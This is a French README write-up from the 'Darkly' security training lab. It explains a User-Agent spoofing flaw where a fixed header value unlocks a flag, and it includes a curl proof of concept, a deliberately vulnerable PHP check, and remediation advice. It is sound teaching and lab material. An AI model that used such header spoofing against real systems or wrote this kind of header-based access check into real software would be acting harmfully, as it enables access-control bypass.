# Darkly — README : Vulnérabilité de falsification du User-Agent (User-Agent Spoofing)

## Résumé
Ce document décrit une vulnérabilité de type **User-Agent Spoofing** (sous-catégorie de **HTTP Header Spoofing**) dans l’application Darkly.  
Le serveur prend une décision de sécurité sur la base de l’en-tête HTTP `User-Agent`, valeur entièrement contrôlable par le client. En fournissant une valeur spécifique (`ft_bornToSec`), il est possible de déclencher un comportement sensible et d’obtenir une flag.

---

## 1) Découverte de la faille

### Preuve de concept reproductible
```bash
curl -v -A "ft_bornToSec" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
```

**Observation :**
- Le serveur répond avec un message de succès contenant la flag.
- Le comportement ne dépend pas d’une authentification réelle, uniquement de la valeur du `User-Agent`.

---

## 2) Compréhension technique

Le `User-Agent` est un en-tête HTTP informatif envoyé par le client.  
Il **n’est pas fiable** pour la sécurité car il peut être modifié librement.

Exemple de code vulnérable :
```php
if ($_SERVER['HTTP_USER_AGENT'] === 'ft_bornToSec') {
    echo 'Good Job Here is the flag';
}
```

---

## 3) Preuve de concept (PoC)

```bash
curl -v -A "ft_bornToSec" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
```

---

## 4) Impact
- Contournement de contrôle d’accès
- Divulgation d’informations sensibles

Sévérité estimée : **Élevée**.

---

## 5) Remédiations recommandées
- Ne jamais baser une logique de sécurité sur `User-Agent` ou `Referer`.
- Mettre en place une authentification serveur réelle.
- Utiliser les en-têtes HTTP à des fins informatives uniquement.

---

## Conclusion
Toute donnée fournie par le client est non fiable pour la sécurité.  
La correction repose sur des contrôles d’accès et une authentification robustes côté serveur.
